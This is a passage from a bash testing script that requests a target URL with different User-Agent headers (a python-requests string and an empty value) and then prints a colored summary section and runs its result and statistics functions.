test_url "UA: Python Requests" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: python-requests/2.31.0'"
test_url "UA: Empty" "$BASE_URL$TARGET_PATH" "-H 'User-Agent: '"

echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
echo -e "${BLUE}[SUMMARY]${NC}"
echo -e "${BLUE}═══════════════════════════════════════${NC}\n"

# Run result
result

# Run statistics
statistics

# Run summary
summary
